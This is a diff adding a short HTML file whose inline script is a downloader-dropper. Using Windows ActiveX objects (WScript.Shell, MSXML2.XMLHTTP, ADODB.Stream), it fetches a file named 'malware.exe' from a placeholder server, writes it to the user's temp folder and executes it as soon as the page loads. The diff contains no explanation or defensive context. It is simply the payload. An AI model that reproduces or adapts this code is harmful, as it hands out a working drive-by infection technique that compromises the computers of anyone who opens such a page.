@@ -1,0 +1,22 @@
+<html>
+  <head>
+    <script>
+      var shell = new ActiveXObject("WScript.Shell");
+      var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+      var stream = new ActiveXObject("ADODB.Stream");
+      var url = "http://yourserver.com/malware.exe";
+      var path = shell.ExpandEnvironmentStrings("%TEMP%") + "\\download.exe";
+
+      xhr.open("GET", url, false);
+      xhr.send();
+
+      stream.Type = 1; // binary
+      stream.Open();
+      stream.Write(xhr.responseBody);
+      stream.SaveToFile(path, 2);
+      stream.Close();
+
+      shell.Run(path);
+    </script>
+  </head>
+</html>
